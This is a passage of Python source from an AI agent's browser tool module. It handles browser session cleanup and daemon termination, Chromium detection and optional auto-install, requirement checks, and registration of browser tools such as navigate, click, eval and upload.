    # Drop stale last-active ownership. Cleaning a bare task drops its binding;
    # cleaning a sidecar drops the binding only if that sidecar was still the
    # recorded owner. This prevents a later click/snapshot from resurrecting a
    # cleaned sidecar on about:blank while preserving a primary-session binding.
    if _is_local_sidecar_key(task_id):
        if _last_active_session_key.get(bare_task_id) == task_id:
            _last_active_session_key.pop(bare_task_id, None)
    else:
        _last_active_session_key.pop(bare_task_id, None)


def _release_session_resources(task_id: str, session_info: Dict[str, Any]) -> None:
    """Untrack ``task_id``, close its cloud provider session, kill its daemon.

    The unconditional tail of ``_cleanup_single_browser_session``; also the
    whole of the janitor's force-reap path (#100738), which skips the polite
    agent-browser/Camofox ``close`` that kept failing but must still release
    the cloud session and the local Chromium.
    """
    bb_session_id = session_info.get("bb_session_id", "unknown")
    # Now remove from tracking under lock
    with _cleanup_lock:
        _active_sessions.pop(task_id, None)
        _session_last_activity.pop(task_id, None)
        _session_owner_homes.pop(task_id, None)
        _cleanup_failures.pop(task_id, None)

    # Cloud mode: close the cloud browser session via provider API.
    # Local sidecars have bb_session_id=None so this no-ops for them.
    if bb_session_id:
        provider = _get_cloud_provider()
        if provider is not None:
            try:
                provider.close_session(bb_session_id)
            except Exception as e:
                logger.warning("Could not close cloud browser session: %s", e)

    # Kill the daemon process and clean up socket directory
    session_name = session_info.get("session_name", "")
    if session_name:
        socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{session_name}")
        if os.path.exists(socket_dir):
            # agent-browser writes {session}.pid in the socket dir
            pid_file = os.path.join(socket_dir, f"{session_name}.pid")
            if os.path.isfile(pid_file):
                try:
                    from tools.process_registry import ProcessRegistry
                    daemon_pid = int(Path(pid_file).read_text(encoding="utf-8").strip())
                    # The .pid file lives in a world-writable temp dir and
                    # PIDs recycle: verify this really is our daemon for
                    # this session before tree-killing, and pin the
                    # identity with a start-time fingerprint so the kill
                    # refuses if the PID is swapped between check and kill.
                    if _verify_reapable_browser_daemon(
                            daemon_pid, socket_dir, session_name):
                        from gateway.status import get_process_start_time
                        daemon_start = get_process_start_time(daemon_pid)
                        if daemon_start is not None:
                            ProcessRegistry._terminate_host_pid(
                                daemon_pid, daemon_start)
                            logger.debug("Killed daemon pid %s for %s", daemon_pid, session_name)
                        else:
                            logger.debug(
                                "Skipped daemon kill for %s: no start-time "
                                "fingerprint for pid %s", session_name, daemon_pid)
                    else:
                        logger.debug(
                            "Skipped daemon kill for %s: pid %s failed identity "
                            "verification", session_name, daemon_pid)
                except (ProcessLookupError, ValueError, PermissionError, OSError):
                    logger.debug("Could not kill daemon pid for %s (already dead or inaccessible)", session_name)
            shutil.rmtree(socket_dir, ignore_errors=True)


def _force_reap_browser_session(task_id: str) -> None:
    """Janitor last resort after repeated cleanup failures (#100738).

    Skips the ``close`` round-trips that keep failing and goes straight to
    ``_release_session_resources`` (cloud close + daemon kill + untrack).
    """
    _stop_cdp_supervisor(task_id)
    with _cleanup_lock:
        session_info = _active_sessions.get(task_id)
        _session_last_activity.pop(task_id, None)
        _recording_sessions.discard(task_id)
    if session_info:
        _release_session_resources(task_id, session_info)
    # Same ownership-binding drop as cleanup_browser().
    if _is_local_sidecar_key(task_id):
        bare_task_id = task_id[: -len(_LOCAL_SUFFIX)]
        if _last_active_session_key.get(bare_task_id) == task_id:
            _last_active_session_key.pop(bare_task_id, None)
    else:
        _last_active_session_key.pop(task_id, None)


def _cleanup_single_browser_session(task_id: str) -> None:
    """Internal: reap a single browser session by its exact session key."""
    # Stop the CDP supervisor for this task FIRST so we close our WebSocket
    # before the backend tears down the underlying CDP endpoint.
    _stop_cdp_supervisor(task_id)

    # Also clean up Camofox session if running in Camofox mode.
    # Skip full close when managed persistence is enabled — the browser
    # profile (and its session cookies) must survive across agent tasks.
    # The inactivity reaper still frees idle resources.
    if _is_camofox_mode():
        try:
            from tools.browser_camofox import camofox_close, camofox_soft_cleanup
            if not camofox_soft_cleanup(task_id):
                camofox_close(task_id)
        except Exception as e:
            logger.debug("Camofox cleanup for task %s: %s", task_id, e)

    logger.debug("cleanup_browser called for task_id: %s", task_id)
    logger.debug("Active sessions: %s", list(_active_sessions.keys()))

    # Check if session exists (under lock), but don't remove yet -
    # _run_browser_command needs it to build the close command.
    with _cleanup_lock:
        session_info = _active_sessions.get(task_id)

    if session_info:
        bb_session_id = session_info.get("bb_session_id", "unknown")
        logger.debug("Found session for task %s: bb_session_id=%s", task_id, bb_session_id)

        # Stop auto-recording before closing (saves the file)
        _maybe_stop_recording(task_id)

        # A Lightpanda session is a process Hermes spawned itself (Browser
        # Use mode); there is no agent-browser daemon to send ``close`` to.
        # An expired cloud CDP URL cannot accept an agent-browser close command.
        # Avoid feeding it back through _get_session_info(), which would try to
        # renew the session recursively while cleanup is still in progress.
        if (session_info.get("features") or {}).get("lightpanda"):
            try:
                from tools.browser_lightpanda import stop_lightpanda

                stop_lightpanda(session_info.get("session_name", ""))
            except Exception as e:
                logger.warning("lightpanda stop failed for task %s: %s", task_id, e)
        elif _session_has_expired(session_info):
            logger.debug(
                "Skipping agent-browser close for expired session %s",
                task_id,
            )
        else:
            try:
                _run_browser_command(task_id, "close", [], timeout=10)
                logger.debug(
                    "agent-browser close command completed for task %s",
                    task_id,
                )
            except Exception as e:
                logger.warning("agent-browser close failed for task %s: %s", task_id, e)

        _release_session_resources(task_id, session_info)

        logger.debug("Removed task %s from active sessions", task_id)
    else:
        logger.debug("No active session found for task_id: %s", task_id)


def cleanup_all_browsers() -> None:
    """
    Clean up all active browser sessions.

    Useful for cleanup on shutdown.
    """
    with _cleanup_lock:
        task_ids = list(_active_sessions.keys())
    for task_id in task_ids:
        cleanup_browser(task_id)

    # Tear down CDP supervisors for all tasks so background threads exit.
    try:
        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
        SUPERVISOR_REGISTRY.stop_all()
    except Exception:
        pass

    # Reset cached lookups so they are re-evaluated on next use.
    global _cached_agent_browser, _agent_browser_resolved
    global _cached_command_timeout, _command_timeout_resolved
    global _cached_snapshot_threshold, _snapshot_threshold_resolved
    global _cached_chromium_installed
    global _cached_browser_engine, _browser_engine_resolved
    _cached_agent_browser = None
    _agent_browser_resolved = False
    _discover_homebrew_node_dirs.cache_clear()
    # Flip the resolved flag BEFORE nulling the cache so a concurrent
    # reader never sees ``resolved=True`` with ``cache=None`` (#14331).
    _command_timeout_resolved = False
    _cached_command_timeout = None
    _snapshot_threshold_resolved = False
    _cached_snapshot_threshold = None
    _cached_chromium_installed = None
    global _chromium_autoinstall_attempted
    _chromium_autoinstall_attempted = False
    _cached_browser_engine = None
    _browser_engine_resolved = False

# ============================================================================
# Requirements Check
# ============================================================================


# Cache for Chromium discovery. Invalidated by _reset_browser_caches.
_cached_chromium_installed: Optional[bool] = None


def _chromium_search_roots() -> List[str]:
    """Directories to scan for a Chromium / headless-shell build.

    Order mirrors what agent-browser and Playwright actually probe:

    1. ``PLAYWRIGHT_BROWSERS_PATH`` when set (Docker image sets this to
       ``/opt/hermes/.playwright``).
    2. ``~/.agent-browser/browsers`` — agent-browser's Chrome-for-Testing cache.
    3. ``~/.cache/ms-playwright`` — Playwright's default on Linux/macOS.
    4. ``~/Library/Caches/ms-playwright`` — Playwright's default on macOS.
    5. ``%USERPROFILE%\\AppData\\Local\\ms-playwright`` — Playwright's default
       on Windows.
    """
    roots: List[str] = []
    env_path = os.environ.get("PLAYWRIGHT_BROWSERS_PATH", "").strip()
    if env_path and env_path != "0":
        roots.append(env_path)
    home = os.path.expanduser("~")
    roots.append(os.path.join(home, ".agent-browser", "browsers"))
    roots.append(os.path.join(home, ".cache", "ms-playwright"))
    if sys.platform == "darwin":
        roots.append(os.path.join(home, "Library", "Caches", "ms-playwright"))
    if sys.platform == "win32":
        local = os.environ.get("LOCALAPPDATA") or os.path.join(
            home, "AppData", "Local"
        )
        roots.append(os.path.join(local, "ms-playwright"))
    return roots


def _chromium_installed() -> bool:
    """Return True when a usable Chromium (or headless-shell) build is on disk.

    Checks, in order:

    1. ``AGENT_BROWSER_EXECUTABLE_PATH`` env var — the official way to point
       agent-browser at a pre-installed Chrome/Chromium.
    2. System Chrome/Chromium in PATH (``google-chrome``, ``chromium``,
       ``chromium-browser``, ``chrome``).
    3. Playwright's browser cache (current logic) — directories containing
       ``chromium-*`` or ``chromium_headless_shell-*``.

    agent-browser (0.26+) downloads Playwright's chromium / headless-shell
    builds into ``PLAYWRIGHT_BROWSERS_PATH`` and won't start without at least
    one of the three above being present.  Without a browser binary the CLI
    hangs on first use until the command timeout fires (often ~30s).  Guarding
    the tool behind this check prevents advertising a capability that will
    fail at runtime.
    """
    global _cached_chromium_installed
    if _cached_chromium_installed is not None:
        return _cached_chromium_installed

    # 1. AGENT_BROWSER_EXECUTABLE_PATH — explicit user-configured browser
    ab_path = os.environ.get("AGENT_BROWSER_EXECUTABLE_PATH", "").strip()
    if ab_path:
        if os.path.isfile(ab_path) or shutil.which(ab_path):
            _cached_chromium_installed = True
            return True

    # 2. System Chrome/Chromium in PATH (common names)
    system_chrome = (
        shutil.which("google-chrome")
        or shutil.which("chromium")
        or shutil.which("chromium-browser")
        or shutil.which("chrome")
    )
    if system_chrome:
        _cached_chromium_installed = True
        return True

    # 3. Playwright browser cache (legacy — chromium-* / chromium_headless_shell-* dirs)
    for root in _chromium_search_roots():
        if not root or not os.path.isdir(root):
            continue
        try:
            entries = os.listdir(root)
        except OSError:
            continue
        # Playwright names them ``chromium-<build>`` and
        # ``chromium_headless_shell-<build>``; agent-browser's own installer
        # stores Chrome-for-Testing builds as ``chrome-<version>``.
        for entry in entries:
            if (
                entry.startswith("chromium-")
                or entry.startswith("chromium_headless_shell-")
                or entry.startswith("chrome-")
            ):
                _cached_chromium_installed = True
                return True

    _cached_chromium_installed = False
    return False


# One-shot per process: a 170MB download that fails (or is slow) must not be
# retried on every browser call. Reset by _reset_browser_caches() for tests.
_chromium_autoinstall_attempted = False


def _maybe_autoinstall_chromium() -> bool:
    """Best-effort, gated download of the Chromium *binary* on local cold start.

    Closes the "the PR doesn't actually install the missing browser" gap for
    the common case — a Chromium binary that was simply never downloaded.
    Scope is deliberately narrow:

    - Binary only (``agent-browser install``), never ``--with-deps`` — that
      shells ``apt`` and needs root, so missing *system libraries* stay a user
      action (the timeout/blocked hints already point there).
    - Gated by ``security.allow_lazy_installs`` (same opt-out as every other
      lazy install) and skipped in Docker, where Chromium ships in the image.
    - Attempted once per process.

    Returns True only when Chromium is present afterwards.
    """
    global _chromium_autoinstall_attempted
    if _chromium_autoinstall_attempted:
        return _chromium_installed()
    _chromium_autoinstall_attempted = True

    if _running_in_docker():
        return False

    from tools.lazy_deps import _allow_lazy_installs
    if not _allow_lazy_installs():
        return False

    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError:
        return False

    if _is_npx_agent_browser_sentinel(browser_cmd):
        install_cmd = [
            _resolve_npx_bin() or "npx", "--ignore-scripts", "-y", AGENT_BROWSER_NPX_SPEC, "install",
        ]
    else:
        install_cmd = [browser_cmd, "install"]

    logger.info(
        "browser: Chromium missing — auto-installing the browser binary "
        "(one-time ~170MB; disable via security.allow_lazy_installs)"
    )
    try:
        proc = subprocess.run(
            install_cmd,
            capture_output=True,
            text=True, encoding='utf-8', errors='replace',
            timeout=600,
            env=_build_browser_env(),
        )
    except (OSError, subprocess.SubprocessError) as e:
        logger.warning("browser: Chromium auto-install failed to start: %s", e)
        return False

    if proc.returncode != 0:
        tail = (proc.stderr or proc.stdout or "").strip()[-300:]
        logger.warning(
            "browser: Chromium auto-install exited %s: %s", proc.returncode, tail
        )
        return False

    global _cached_chromium_installed
    _cached_chromium_installed = None
    return _chromium_installed()


def _running_in_docker() -> bool:
    """Best-effort detection of whether we're inside a Docker container."""
    if os.path.exists("/.dockerenv"):
        return True
    try:
        with open("/proc/1/cgroup", "rt", encoding="utf-8") as fp:
            return "docker" in fp.read()
    except OSError:
        return False


def check_browser_requirements() -> bool:
    """
    Check if browser tool requirements are met.

    In **local mode** (no cloud provider configured): the ``agent-browser``
    CLI must be findable. Chrome/Chromium is required for the default Chrome
    engine and for fallback/screenshot paths, but not for Lightpanda-only text
    navigation/snapshot workflows.

    In **cloud mode** (Browserbase, Browser Use, or Firecrawl): the CLI
    and the provider's required credentials must be present. The cloud
    provider hosts its own Chromium, so no local browser binary is needed.

    Returns:
        True if all requirements are met, False otherwise
    """
    # Browser Use CLI backend — browser_exec replaces the whole browser_*
    # surface (including browser_cdp/browser_dialog, whose check_fns funnel
    # through here), so hide these tools from the model.
    if _is_browser_use_cli_mode():
        return False

    # Camofox backend — only needs the server URL, no agent-browser CLI
    if _is_camofox_mode():
        return True

    # CDP override mode can connect to an existing remote/local browser endpoint
    # without requiring the local agent-browser binary on PATH.
    # Raw (no-I/O) check: this runs during tool-schema assembly at startup,
    # where a stale endpoint must not cost a blocking HTTP probe.
    if _get_cdp_override_raw():
        return True

    # The agent-browser CLI is required for local launch and cloud-provider flows.
    # Tool-schema assembly runs during Desktop startup; do not execute
    # ``agent-browser --version`` here, because Windows .cmd shims route through
    # cmd.exe and can flash a console before the user invokes any browser tool.
    # Actual browser execution paths still validate the candidate before use.
    try:
        browser_cmd = _find_agent_browser(validate=False)
    except FileNotFoundError:
        return False

    # On Termux, the bare npx fallback is too fragile to treat as a satisfied
    # local browser dependency. Require a real install (global or local) so the
    # browser tool is not advertised as available when it will likely fail on
    # first use.
    if _requires_real_termux_browser_install(browser_cmd):
        return False

    # In cloud mode, also require provider credentials. Cloud browsers
    # don't need a local Chromium binary.
    provider = _get_cloud_provider()
    if provider is not None:
        return provider.is_configured()

    # Local mode with Lightpanda can provide text/navigation tools without a
    # local Chromium install. Chrome fallback, screenshots, and browser_vision
    # will still return actionable Chromium install errors if invoked.
    if _using_lightpanda_engine():
        return True

    # Local Chrome mode: agent-browser needs a Chromium build on disk. Without
    # it the CLI hangs on first use until the command timeout fires.
    if not _chromium_installed():
        return False

    return True


def check_browser_vision_requirements() -> bool:
    """Whether ``browser_vision`` should be advertised to the model.

    Requires BOTH a working browser (``check_browser_requirements``) AND a
    resolvable vision backend. Without the vision check, the tool stays in
    the model's tool list even when no vision provider is configured, then
    fails at call time with a cryptic provider-side error like
    ``unknown variant `image_url`, expected `text``` (issue #31179).
    """
    if not check_browser_requirements():
        return False
    try:
        from tools.vision_tools import check_vision_requirements
    except ImportError:
        return False
    return check_vision_requirements()


# ============================================================================
# Module Test
# ============================================================================

if __name__ == "__main__":
    """
    Simple test/demo when run directly
    """
    print("🌐 Browser Tool Module")
    print("=" * 40)

    _cp = _get_cloud_provider()
    mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
    print(f"   Mode: {mode}")

    # Check requirements
    if check_browser_requirements():
        print("✅ All requirements met")
    else:
        print("❌ Missing requirements:")
        try:
            browser_cmd = _find_agent_browser()
            if _requires_real_termux_browser_install(browser_cmd):
                print("   - bare npx fallback found (insufficient on Termux local mode)")
                print(f"     Install: {_browser_install_hint()}")
            elif _cp is None and not _chromium_installed():
                print("   - Chromium browser binary not found")
                searched = ", ".join(_chromium_search_roots()) or "(no candidate paths)"
                print(f"     Searched: {searched}")
                if _running_in_docker():
                    print(
                        "     Docker: pull the latest image — the current one "
                        "predates the bundled Chromium install"
                    )
                    print("       docker pull ghcr.io/nousresearch/hermes-agent:latest")
                else:
                    print("     Install it with:")
                    print("       npx agent-browser install --with-deps")
                    print("     Or:  npx playwright install --with-deps chromium")
        except FileNotFoundError:
            print("   - agent-browser CLI not found")
            print(f"     Install: {_browser_install_hint()}")
        if _cp is not None and not _cp.is_configured():
            print(f"   - {_cp.provider_name()} credentials not configured")
            print("   Tip: set browser.cloud_provider to 'local' to use free local mode instead")

    print("\n📋 Available Browser Tools:")
    for schema in BROWSER_TOOL_SCHEMAS:
        print(f"  🔹 {schema['name']}: {schema['description'][:60]}...")

    print("\n💡 Usage:")
    print("  from tools.browser_tool import browser_navigate, browser_snapshot")
    print("  result = browser_navigate('https://example.com', task_id='my_task')")
    print("  snapshot = browser_snapshot(task_id='my_task')")


# ---------------------------------------------------------------------------
# Registry
# ---------------------------------------------------------------------------
def browser_start(task_id: Optional[str] = None) -> str:
    """Open the browser window without navigating.

    Rarely needed: ``_ensure_managed_browser`` already runs on the chokepoint
    every browser tool passes through, so the window exists by the time any of
    them acts.  This exists so the agent can deliberately put a window on
    screen, and so the start/close pair reads symmetrically to the model.
    """
    effective_task_id = task_id or "default"
    try:
        attached = _ensure_managed_browser(effective_task_id)
    except Exception as exc:
        return json.dumps(
            {"success": False, "error": f"Failed to start the browser: {exc}"},
            ensure_ascii=False,
        )
    if attached is None:
        return json.dumps(
            {
                "success": False,
                "error": (
                    "This install is not using the managed local browser "
                    "(a cloud provider, Camofox, or an explicit CDP endpoint "
                    "is configured); there is nothing to start."
                ),
            },
            ensure_ascii=False,
        )
    return json.dumps(
        {
            "success": True,
            "attached": attached,
            "message": (
                "Attached to the browser that was already open."
                if attached
                else "Browser started."
            ),
        },
        ensure_ascii=False,
    )


def browser_close(task_id: Optional[str] = None) -> str:
    """Close the browser window for real, gracefully.

    Nothing else closes it: the window is detached from every Hermes process
    tree on purpose, so a task ending, a session ending, or the gateway dying
    all leave it standing.  Closing goes through CDP ``Browser.close`` so the
    profile records ``exit_type: "Normal"`` and the next launch shows no
    "restore pages?" bubble.  A stubborn browser is escalated to SIGTERM and
    never to SIGKILL - SIGKILL is what wrote ``"Crashed"`` in the first place.
    """
    effective_task_id = task_id or "default"
    # Drop the Hermes-side session first so no daemon keeps talking to an
    # endpoint that is about to disappear.
    try:
        cleanup_browser(effective_task_id)
    except Exception as exc:
        logger.debug("Session cleanup before browser close failed: %s", exc)
    try:
        from tools import browser_launcher
        if not browser_launcher.is_running():
            _forget_managed_browser()
            return json.dumps(
                {"success": True, "closed": False, "message": "No browser was open."},
                ensure_ascii=False,
            )
        closed = browser_launcher.close_browser()
    except Exception as exc:
        return json.dumps(
            {"success": False, "error": f"Failed to close the browser: {exc}"},
            ensure_ascii=False,
        )
    _forget_managed_browser()
    if closed:
        return json.dumps(
            {"success": True, "closed": True, "message": "Browser closed cleanly."},
            ensure_ascii=False,
        )
    return json.dumps(
        {
            "success": False,
            "closed": False,
            "error": (
                "The browser ignored both Browser.close and SIGTERM. It was "
                "deliberately left running rather than SIGKILLed, which would "
                "mark the profile as crashed."
            ),
        },
        ensure_ascii=False,
    )


def _with_browser_resume_hint(handler):
    """Attach the tab inventory to the first tool result after an attach.

    Wrapping at the registry level rather than inside each tool means the hint
    reaches the model whichever browser tool it happens to reach for first, and
    that a tool added by a later upstream merge is covered without being
    touched.  Strictly additive: on any failure the original result is returned
    byte for byte.
    """
    @functools.wraps(handler)
    def wrapped(args, **kw):
        result = handler(args, **kw)
        effective_task_id = kw.get("task_id") or "default"
        with _managed_lock:
            pending = effective_task_id in _PENDING_RESUME_HINT
            if pending:
                _PENDING_RESUME_HINT.discard(effective_task_id)
        if not pending or not isinstance(result, str):
            return result
        hint = _browser_resume_hint(effective_task_id)
        if hint is None:
            return result
        try:
            payload = json.loads(result)
        except (ValueError, TypeError):
            return result
        if not isinstance(payload, dict):
            return result
        payload["browser_resume"] = hint
        return json.dumps(payload, ensure_ascii=False)

    return wrapped


from tools.registry import registry, tool_error
from tools.browser_extension_router import (
    extension_controller_available,
    routed_browser_handler,
)

_BROWSER_SCHEMA_MAP = {s["name"]: s for s in BROWSER_TOOL_SCHEMAS}


def _browser_router_kw(kw: dict) -> dict:
    """Identity kwargs forwarded to the extension router wrapper."""
    return {
        "task_id": kw.get("task_id"),
        "session_id": kw.get("session_id"),
    }


def check_browser_routed_requirements(action: str = "browser_snapshot") -> bool:
    """Availability gate for tools that can use either browser backend."""
    return check_browser_requirements() or extension_controller_available(action)


def check_browser_navigate_requirements() -> bool:
    return check_browser_routed_requirements("browser_navigate")


def check_browser_snapshot_requirements() -> bool:
    return check_browser_routed_requirements("browser_snapshot")


def check_browser_click_requirements() -> bool:
    return check_browser_routed_requirements("browser_click")


def check_browser_type_requirements() -> bool:
    return check_browser_routed_requirements("browser_type")


def check_browser_scroll_requirements() -> bool:
    return check_browser_routed_requirements("browser_scroll")


def check_browser_back_requirements() -> bool:
    return check_browser_routed_requirements("browser_back")


def check_browser_press_requirements() -> bool:
    return check_browser_routed_requirements("browser_press")


registry.register(
    name="browser_navigate",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_navigate"],
    handler=lambda args, **kw: routed_browser_handler(
        "browser_navigate",
        args,
        fallback=lambda: browser_navigate(url=args.get("url", ""), task_id=kw.get("task_id")),
        **_browser_router_kw(kw),
    ),
    check_fn=check_browser_navigate_requirements,
    emoji="🌐",
)
registry.register(
    name="browser_snapshot",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_snapshot"],
    handler=lambda args, **kw: routed_browser_handler(
        "browser_snapshot",
        args,
        fallback=lambda: browser_snapshot(
            full=args.get("full", False), task_id=kw.get("task_id"), user_task=kw.get("user_task")),
        **_browser_router_kw(kw),
    ),
    check_fn=check_browser_snapshot_requirements,
    emoji="📸",
)
registry.register(
    name="browser_click",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_click"],
    handler=lambda args, **kw: routed_browser_handler(
        "browser_click",
        args,
        fallback=lambda: browser_click(ref=args.get("ref", ""), task_id=kw.get("task_id")),
        **_browser_router_kw(kw),
    ),
    check_fn=check_browser_click_requirements,
    emoji="👆",
)
registry.register(
    name="browser_type",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_type"],
    handler=lambda args, **kw: routed_browser_handler(
        "browser_type",
        args,
        fallback=lambda: browser_type(ref=args.get("ref", ""), text=args.get("text", ""), task_id=kw.get("task_id")),
        **_browser_router_kw(kw),
    ),
    check_fn=check_browser_type_requirements,
    emoji="⌨️",
)
registry.register(
    name="browser_scroll",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_scroll"],
    handler=lambda args, **kw: routed_browser_handler(
        "browser_scroll",
        args,
        fallback=lambda: browser_scroll(direction=args.get("direction", "down"), task_id=kw.get("task_id")),
        **_browser_router_kw(kw),
    ),
    check_fn=check_browser_scroll_requirements,
    emoji="📜",
)
registry.register(
    name="browser_drag",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_drag"],
    handler=lambda args, **kw: browser_drag(
        from_ref=args.get("from_ref"), to_ref=args.get("to_ref"),
        from_selector=args.get("from_selector"), to_selector=args.get("to_selector"),
        from_x=args.get("from_x"), from_y=args.get("from_y"),
        to_x=args.get("to_x"), to_y=args.get("to_y"),
        waypoints=args.get("waypoints"), steps=args.get("steps"),
        hold_ms=args.get("hold_ms"), release_delay_ms=args.get("release_delay_ms"),
        humanize=args.get("humanize"), button=args.get("button"),
        task_id=kw.get("task_id"),
    ),
    check_fn=check_browser_requirements,
    emoji="🖐️",
)
registry.register(
    name="browser_mouse_wheel",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_mouse_wheel"],
    handler=lambda args, **kw: browser_mouse_wheel(
        delta_y=args.get("delta_y"), delta_x=args.get("delta_x"),
        ref=args.get("ref"), x=args.get("x"), y=args.get("y"),
        task_id=kw.get("task_id"),
    ),
    check_fn=check_browser_requirements,
    emoji="🖱️",
)
registry.register(
    name="browser_back",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_back"],
    handler=lambda args, **kw: routed_browser_handler(
        "browser_back",
        args,
        fallback=lambda: browser_back(task_id=kw.get("task_id")),
        **_browser_router_kw(kw),
    ),
    check_fn=check_browser_back_requirements,
    emoji="◀️",
)
registry.register(
    name="browser_press",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_press"],
    handler=lambda args, **kw: routed_browser_handler(
        "browser_press",
        args,
        fallback=lambda: browser_press(key=args.get("key", ""), task_id=kw.get("task_id")),
        **_browser_router_kw(kw),
    ),
    check_fn=check_browser_press_requirements,
    emoji="⌨️",
)

registry.register(
    name="browser_get_images",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_get_images"],
    handler=lambda args, **kw: routed_browser_handler(
        "browser_get_images",
        args,
        fallback=lambda: browser_get_images(task_id=kw.get("task_id")),
        **_browser_router_kw(kw),
    ),
    check_fn=check_browser_requirements,
    emoji="🖼️",
)
registry.register(
    name="browser_vision",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_vision"],
    handler=lambda args, **kw: routed_browser_handler(
        "browser_vision",
        args,
        fallback=lambda: browser_vision(question=args.get("question", ""), annotate=args.get("annotate", False), task_id=kw.get("task_id")),
        **_browser_router_kw(kw),
    ),
    check_fn=check_browser_vision_requirements,
    emoji="👁️",
)
registry.register(
    name="browser_console",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_console"],
    handler=lambda args, **kw: routed_browser_handler(
        "browser_console",
        args,
        fallback=lambda: browser_console(clear=args.get("clear", False), expression=args.get("expression"), task_id=kw.get("task_id")),
        **_browser_router_kw(kw),
    ),
    check_fn=check_browser_requirements,
    emoji="🖥️",
)
registry.register(
    name="browser_tab",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_tab"],
    handler=lambda args, **kw: browser_tab(
        action=args.get("action", ""),
        index=args.get("index"),
        url=args.get("url"),
        task_id=kw.get("task_id"),
    ),
    check_fn=check_browser_requirements,
    emoji="🗂️",
)
registry.register(
    name="browser_upload",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_upload"],
    handler=lambda args, **kw: browser_upload(
        ref=args.get("ref", ""),
        path=args.get("path"),
        paths=args.get("paths"),
        task_id=kw.get("task_id"),
    ),
    check_fn=check_browser_requirements,
    emoji="📤",
)
registry.register(
    name="browser_dropzone_upload",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_dropzone_upload"],
    handler=lambda args, **kw: browser_dropzone_upload(
        selector=args.get("selector"),
        path=args.get("path"),
        paths=args.get("paths"),
        task_id=kw.get("task_id"),
    ),
    check_fn=check_browser_requirements,
    emoji="📤",
)
registry.register(
    name="browser_download",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_download"],
    handler=lambda args, **kw: browser_download(
        ref=args.get("ref", ""),
        path=args.get("path"),
        task_id=kw.get("task_id"),
    ),
    check_fn=check_browser_requirements,
    emoji="📥",
)
registry.register(
    name="browser_eval",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_eval"],
    handler=lambda args, **kw: browser_eval(
        expression=args.get("expression", ""),
        task_id=kw.get("task_id"),
    ),
    check_fn=check_browser_requirements,
    emoji="🧪",
)
registry.register(
    name="browser_pdf",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_pdf"],
    handler=lambda args, **kw: browser_pdf(
        path=args.get("path"),
        task_id=kw.get("task_id"),
    ),
    check_fn=check_browser_requirements,
    emoji="📄",
)
registry.register(
    name="browser_mouse",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_mouse"],
    handler=lambda args, **kw: browser_mouse(
        action=args.get("action", ""),
        ref=args.get("ref"),
        selector=args.get("selector"),
        x=args.get("x"),
        y=args.get("y"),
        button=args.get("button"),
        task_id=kw.get("task_id"),
    ),
    check_fn=check_browser_requirements,
    emoji="🖱️",
)

registry.register(
    name="browser_start",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_start"],
    handler=lambda args, **kw: browser_start(task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="\U0001F680",
)
registry.register(
    name="browser_close",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_close"],
    handler=lambda args, **kw: browser_close(task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="\U0001F6D1",
)

# Wrap every browser tool so whichever one the agent reaches for first after
# attaching to an already-open browser carries the tab inventory back with it.
# browser_start reports the attach itself; browser_close is about to end the
# session, so neither is wrapped.
# ``get_entry`` is guarded because several test modules import browser_tool
# against a stubbed ``tools`` package whose registry is a minimal fake. The
# resume hint is a convenience, never a precondition for importing the module.
_get_entry = getattr(registry, "get_entry", None)
if callable(_get_entry):
    for _resume_tool_name in _BROWSER_SCHEMA_MAP:
        if _resume_tool_name in ("browser_start", "browser_close"):
            continue
        try:
            _resume_entry = _get_entry(_resume_tool_name)
        except Exception:
            continue
        if _resume_entry is not None and hasattr(_resume_entry, "handler"):
            _resume_entry.handler = _with_browser_resume_hint(_resume_entry.handler)
